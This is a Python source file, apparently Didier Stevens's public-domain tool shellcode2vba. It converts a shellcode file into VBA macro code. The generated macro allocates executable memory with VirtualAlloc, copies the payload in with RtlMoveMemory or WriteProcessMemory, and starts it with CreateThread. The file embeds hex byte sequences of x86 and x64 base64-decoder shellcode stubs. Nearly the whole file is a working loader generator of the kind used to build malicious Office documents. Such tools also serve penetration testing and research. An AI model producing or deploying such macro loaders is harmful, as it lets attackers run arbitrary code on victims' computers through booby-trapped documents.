#!/usr/bin/env python

__description__ = 'Tool to create a VBA script containing shellcode to execute'
__author__ = 'Didier Stevens'
__version__ = '0.5'
__date__ = '2016/11/16'

"""

Source code put in public domain by Didier Stevens, no Copyright
https://DidierStevens.com
Use at your own risk

History:
  2008/11/22: V0.1 forked from file2vbscript
  2010/02/13: V0.2 added base64 option
  2012/12/19: Fixed BASE64 line length to 80 in stead of 81
  2013/04/24: V0.3 added x64 option; thanks to dominic@sensepost.com
  2013/04/26: Added base64 encoding for x64
  2015/09/18: V0.4 added option --nocreatethread and --writememory
  2015/11/29: refactoring, added option --start
  2016/11/16: V0.5 added option -S

Todo:
"""

import optparse
import base64

def Shellcode2VBA(filenameShellcode, filenameVBAscript, encoding, x64, nocreatethread, writememory, start, suffix):
    fPayload = open(filenameShellcode, 'rb')
    payload = fPayload.read()
    if encoding == 'base64':
        # to simplify the base64 shellcode decoder, we make the payload's size to be a multiple of 3 by padding with 0-bytes
        # end mark the end of the base64 string with character =
        payloadLenMod3 = len(payload) % 3
        if payloadLenMod3 > 0:
            payload += '\x00' * (3 - payloadLenMod3)
        payload = base64.standard_b64encode(payload) + '='
    fPayload.close()

    outfile = open(filenameVBAscript, 'w')

    if not x64:
        print >> outfile, 'Private Declare Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long'
        if writememory == 'move':
            print >> outfile, 'Private Declare Sub RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As Long, ByVal sSource As String, ByVal lLength As Long)'
        else:
            print >> outfile, 'Private Declare Function WriteProcessMemory Lib "KERNEL32" (ByVal hProcess As Long, ByVal lpAddress As Long, ByVal lpBuffer As String, ByVal dwSize As Long, ByRef lpNumberOfBytesWritten As Long) As Integer'
        print >> outfile, 'Private Declare Function CreateThread Lib "KERNEL32" (ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, ByVal lpParameter As Long, ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As Long'
    else:
        print >> outfile, 'Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As LongLong, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr'
        if writememory == 'move':
            print >> outfile, 'Private Declare PtrSafe Sub RtlMoveMemory Lib "kernel32" (ByVal lDestination As LongPtr, ByVal sSource As String, ByVal lLength As Long)'
        else:
            print >> outfile, 'Private Declare PtrSafe Function WriteProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, ByVal lpBuffer As Any, ByVal nSize As LongLong, ByRef lpNumberOfBytesWritten As LongPtr) As Long'
        print >> outfile, 'Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal lpThreadAttributes As LongPtr, ByVal dwStackSize As LongLong, ByVal lpStartAddress As LongPtr, ByVal lpParameter As LongPtr, ByVal dwCreationFlags As Long, ByRef lpThreadId As LongPtr) As LongPtr'
    print >> outfile, ''
    print >> outfile, 'Const MEM_COMMIT = &H1000'
    print >> outfile, 'Const PAGE_EXECUTE_READWRITE = &H40'
    print >> outfile, ''

    print >> outfile, ('Public Sub %s()' % (start + suffix))
    print >> outfile, '\tDim sShellCode As String'
    if not x64:
        print >> outfile, '\tDim lpMemory As Long'
        print >> outfile, '\tDim lResult As Long'
    else:
        print >> outfile, '\tDim lpMemory As LongPtr'
        print >> outfile, '\tDim lResult As LongPtr'
    print >> outfile, ''
    print >> outfile, '\tsShellCode = ShellCode%s()' % suffix
    print >> outfile, '\tlpMemory = VirtualAlloc(0&, Len(sShellCode), MEM_COMMIT, PAGE_EXECUTE_READWRITE)'
    if writememory == 'move':
        print >> outfile, '\tRtlMoveMemory lpMemory, sShellCode, Len(sShellCode)'
    else:
        print >> outfile, '\tlResult = WriteProcessMemory(-1&, lpMemory, sShellCode, Len(sShellCode), 0&)'
    if nocreatethread:
        print >> outfile, '\tMsgBox "Address: " & Hex(lpMemory)'
    else:
        print >> outfile, '\tlResult = CreateThread(0&, 0&, lpMemory, 0&, 0&, 0&)'
    print >> outfile, 'End Sub'
    print >> outfile, ''

    countLine = 0
    countSubs = 1
    line = ''

    if encoding == 'legacy':
        print >> outfile, 'Private Function ParseBytes(strBytes) As String'
        print >> outfile, '\tDim aNumbers'
        print >> outfile, '\tDim sShellCode As String'
        print >> outfile, '\tDim iIter'
        print >> outfile, ''
        print >> outfile, '\tsShellCode = ""'
        print >> outfile, '\taNumbers = split(strBytes)'
        print >> outfile, '\tfor iIter = lbound(aNumbers) to ubound(aNumbers)'
        print >> outfile, '\t\tsShellCode = sShellCode + Chr(aNumbers(iIter))'
        print >> outfile, '\tnext'
        print >> outfile, ''
        print >> outfile, '\tParseBytes = sShellCode'
        print >> outfile, 'End Function'
        print >> outfile, ''

    print >> outfile, 'Private Function ShellCode%d%s() As String' % (countSubs, suffix)
    print >> outfile, '\tDim sShellCode As String'
    print >> outfile, ''
    print >> outfile, '\tsShellCode = ""'

    for inbyte in payload:
        if encoding == 'legacy':
            if len(line) > 0:
                line = line + ' '
            line = line + '%d' % ord(inbyte)
        else:
            line = line + '%s' % inbyte
        if len(line) >= 80:
            if encoding == 'legacy':
                print >> outfile, '\tsShellCode = sShellCode + ParseBytes("%s")' % line
            else:
                print >> outfile, '\tsShellCode = sShellCode + "%s"' % line
            line = ''
            countLine += 1
            if countLine > 99:
                countLine = 0
                print >> outfile, ''
                print >> outfile, '\tShellCode%d%s = sShellCode' % (countSubs, suffix)
                print >> outfile, 'End Function'
                print >> outfile, ''
                countSubs += 1
                print >> outfile, 'Private Function ShellCode%d%s() As String' % (countSubs, suffix)
                print >> outfile, '\tDim sShellCode As String'
                print >> outfile, ''
                print >> outfile, '\tsShellCode = ""'

    if len(line) > 0:
        if encoding == 'legacy':
            print >> outfile, '\tsShellCode = sShellCode + ParseBytes("%s")' % line
        else:
            print >> outfile, '\tsShellCode = sShellCode + "%s"' % line

    print >> outfile, ''
    print >> outfile, '\tShellCode%d%s = sShellCode' % (countSubs, suffix)
    print >> outfile, 'End Function'
    print >> outfile, ''

    print >> outfile, 'Private Function ShellCode%s() As String' % suffix
    print >> outfile, '\tDim sShellCode As String'
    print >> outfile, ''
    if encoding == 'legacy':
        print >> outfile, '\tsShellCode = ""'
    elif x64:
        # sc-x64-md3.asm
        print >> outfile, '\tsShellCode = chr(&hEB) + chr(&h3A) + chr(&h31) + chr(&hD2) + chr(&h80) + chr(&h3B) + chr(&h2B) + chr(&h75) + chr(&h04) + chr(&hB2) + chr(&h3E) + chr(&hEB) + chr(&h26) + chr(&h80) + chr(&h3B) + chr(&h2F)'
        print >> outfile, '\tsShellCode = sShellCode + chr(&h75) + chr(&h04) + chr(&hB2) + chr(&h3F) + chr(&hEB) + chr(&h1D) + chr(&h80) + chr(&h3B) + chr(&h39) + chr(&h77) + chr(&h07) + chr(&h8A) + chr(&h13) + chr(&h80) + chr(&hEA) + chr(&hFC)'
        print >> outfile, '\tsShellCode = sShellCode + chr(&hEB) + chr(&h11) + chr(&h80) + chr(&h3B) + chr(&h5A) + chr(&h77) + chr(&h07) + chr(&h8A) + chr(&h13) + chr(&h80) + chr(&hEA) + chr(&h41) + chr(&hEB) + chr(&h05) + chr(&h8A) + chr(&h13)'
        print >> outfile, '\tsShellCode = sShellCode + chr(&h80) + chr(&hEA) + chr(&h47) + chr(&hC1) + chr(&hE0) + chr(&h06) + chr(&h08) + chr(&hD0) + chr(&h48) + chr(&hFF) + chr(&hC3) + chr(&hC3) + chr(&h48) + chr(&h8D) + chr(&h0D) + chr(&h30)'
        print >> outfile, '\tsShellCode = sShellCode + chr(&h00) + chr(&h00) + chr(&h00) + chr(&h48) + chr(&h89) + chr(&hCB) + chr(&h31) + chr(&hC0) + chr(&h80) + chr(&h3B) + chr(&h3D) + chr(&h74) + chr(&h26) + chr(&hE8) + chr(&hB0) + chr(&hFF)'
        print >> outfile, '\tsShellCode = sShellCode + chr(&hFF) + chr(&hFF) + chr(&hE8) + chr(&hAB) + chr(&hFF) + chr(&hFF) + chr(&hFF) + chr(&hE8) + chr(&hA6) + chr(&hFF) + chr(&hFF) + chr(&hFF) + chr(&hE8) + chr(&hA1) + chr(&hFF) + chr(&hFF)'
        print >> outfile, '\tsShellCode = sShellCode + chr(&hFF) + chr(&h86) + chr(&hC4) + chr(&hC1) + chr(&hC0) + chr(&h10) + chr(&h86) + chr(&hC4) + chr(&hC1) + chr(&hC8) + chr(&h08) + chr(&h89) + chr(&h01) + chr(&h48) + chr(&h83) + chr(&hC1)'
        print >> outfile, '\tsShellCode = sShellCode + chr(&h03) + chr(&hEB) + chr(&hD3)'
    else:
        # sc-md3.asm
        print >> outfile, '\tsShellCode = chr(&hEB) + chr(&h3A) + chr(&h31) + chr(&hD2) + chr(&h80) + chr(&h3B) + chr(&h2B) + chr(&h75) + chr(&h04) + chr(&hB2)'
        print >> outfile, '\tsShellCode = sShellCode + chr(&h3E) + chr(&hEB) + chr(&h26) + chr(&h80) + chr(&h3B) + chr(&h2F) + chr(&h75) + chr(&h04) + chr(&hB2) + chr(&h3F)'
        print >> outfile, '\tsShellCode = sShellCode + chr(&hEB) + chr(&h1D) + chr(&h80) + chr(&h3B) + chr(&h39) + chr(&h77) + chr(&h07) + chr(&h8A) + chr(&h13) + chr(&h80)'
        print >> outfile, '\tsShellCode = sShellCode + chr(&hEA) + chr(&hFC) + chr(&hEB) + chr(&h11) + chr(&h80) + chr(&h3B) + chr(&h5A) + chr(&h77) + chr(&h07) + chr(&h8A)'
        print >> outfile, '\tsShellCode = sShellCode + chr(&h13) + chr(&h80) + chr(&hEA) + chr(&h41) + chr(&hEB) + chr(&h05) + chr(&h8A) + chr(&h13) + chr(&h80) + chr(&hEA)'
        print >> outfile, '\tsShellCode = sShellCode + chr(&h47) + chr(&hC1) + chr(&hE0) + chr(&h06) + chr(&h08) + chr(&hD0) + chr(&h43) + chr(&hC3) + chr(&hEB) + chr(&h05)'
        print >> outfile, '\tsShellCode = sShellCode + chr(&hE8) + chr(&hF9) + chr(&hFF) + chr(&hFF) + chr(&hFF) + chr(&h5B) + chr(&h31) + chr(&hC9) + chr(&h80) + chr(&hC1)'
        print >> outfile, '\tsShellCode = sShellCode + chr(&h36) + chr(&h01) + chr(&hCB) + chr(&h89) + chr(&hD9) + chr(&h31) + chr(&hC0) + chr(&h80) + chr(&h3B) + chr(&h3D)'
        print >> outfile, '\tsShellCode = sShellCode + chr(&h74) + chr(&h25) + chr(&hE8) + chr(&hAB) + chr(&hFF) + chr(&hFF) + chr(&hFF) + chr(&hE8) + chr(&hA6) + chr(&hFF)'
        print >> outfile, '\tsShellCode = sShellCode + chr(&hFF) + chr(&hFF) + chr(&hE8) + chr(&hA1) + chr(&hFF) + chr(&hFF) + chr(&hFF) + chr(&hE8) + chr(&h9C) + chr(&hFF)'
        print >> outfile, '\tsShellCode = sShellCode + chr(&hFF) + chr(&hFF) + chr(&h86) + chr(&hC4) + chr(&hC1) + chr(&hC0) + chr(&h10) + chr(&h86) + chr(&hC4) + chr(&hC1)'
        print >> outfile, '\tsShellCode = sShellCode + chr(&hC8) + chr(&h08) + chr(&h89) + chr(&h01) + chr(&h83) + chr(&hC1) + chr(&h03) + chr(&hEB) + chr(&hD4)'
    for iIter in range(1, countSubs+1):
        print >> outfile, '\tsShellCode = sShellCode + ShellCode%d%s()' % (iIter, suffix)
    print >> outfile, ''
    print >> outfile, '\tShellCode%s = sShellCode' % suffix
    print >> outfile, 'End Function'

    outfile.close()

def Main():
    oParser = optparse.OptionParser(usage='usage: %prog [options] infile outfile.vbs\n' + __description__ + '\nVersion V' + __version__, version='%prog ' + __version__)
    oParser.add_option('-e', '--encoding', default='base64', help='select encoding: base64 (default) or legacy')
    oParser.add_option('-x', '--x64', action='store_true', default=False, help='generate VBA for 64-bit')
    oParser.add_option('-n', '--nocreatethread', action='store_true', default=False, help='do not call CreateThread')
    oParser.add_option('-w', '--writememory', default='move', help='select how to write to memory: move (default) or process')
    oParser.add_option('-s', '--start', default='ExecuteShellCode', help='name of start Sub (default ExecuteShellCode)')
    oParser.add_option('-S', '--suffix', default='', help='Suffix for function names')
    (options, args) = oParser.parse_args()

    if len(args) != 2 or not options.encoding in ('legacy', 'base64') or not options.writememory in ('move', 'process'):
        oParser.print_help()
        print ''
        print '  %s' % __description__
        print '  Source code put in the public domain by Didier Stevens, no Copyright'
        print '  Use at your own risk'
        print '  https://DidierStevens.com'
        return

    else:
        Shellcode2VBA(args[0], args[1], options.encoding, options.x64, options.nocreatethread, options.writememory, options.start, options.suffix)

if __name__ == '__main__':
    Main()
